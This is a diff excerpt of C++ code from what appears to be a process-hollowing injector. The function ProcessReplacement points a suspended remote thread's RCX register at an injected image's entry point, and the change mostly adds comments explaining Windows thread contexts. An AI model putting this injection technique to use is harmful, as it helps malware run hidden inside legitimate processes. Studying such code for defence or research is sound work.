@@ -423,9 +423,14 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	// cast new callable entry point from remote process base address
 	auto dwEntrypoint = reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
 
-
+	// Under a multitasking OS like Windows, there can be several programs running at the same time.
+	// Windows gives each thread a timeslice. When that timeslice expires, 
+	// Windows freezes the present thread and switches to the next thread that has the highest priority.
+	// Just before switching to the other thread, Windows saves values in registers of the present thread
+	// so that when the time comes to resume the thread, Windows can restore the last *environment* of that thread.
+	// The saved values of the registers are collectively called a context.
 	LPCONTEXT remoteProcessContext = new CONTEXT();		//This is a debugging structure to hold the old process "context" like registers and whatnot
-	remoteProcessContext->ContextFlags = CONTEXT_ALL;	//I actually don't know what this flag is used for, research time!
+	remoteProcessContext->ContextFlags = CONTEXT_FULL;	// A value indicating which portions of the Context structure should be initialized. This parameter influences the size of the initialized Context structure.
 
 
 	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))	//get context to be used to restore process
@@ -435,7 +440,6 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	}
 
 	remoteProcessContext->Rcx = dwEntrypoint;			//Set RCX register to the EntryPoint
-	remoteProcessContext->ContextFlags = CONTEXT_FULL;	//Otherwise restore normal context
 
 	if (!SetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
 	{
